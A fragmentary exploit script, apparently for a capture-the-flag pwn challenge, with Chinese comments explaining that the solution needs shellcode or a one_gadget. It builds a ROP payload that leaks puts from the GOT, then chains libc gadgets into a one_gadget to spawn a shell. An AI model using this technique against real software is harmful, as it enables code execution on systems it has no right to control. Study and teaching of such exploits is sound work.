#该题坑点较多，方法有两种，一是shellcode，二是onegadget,不能直接用system链
...
main_addr=0x40123E
payload1=p64(ret)*24+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
...
onegadget=libc_base+0xef52b
pop_rax=0xdd237+libc_base
#----------利用libc.so.6的gadget,第一次做时忽略了这一点，只会在./pwn中找pop gadget
#----------实际上libc.so.6用处很大
...
payload3=p64(ret)*11+p64(fake_addr+0x10)+p64(0)+p64(ret)*15+p64(pop_rax)+p64(0)+p64(onegadget)
...
print(len(payload3))
print(f"onegadget:{hex(onegadget)}")
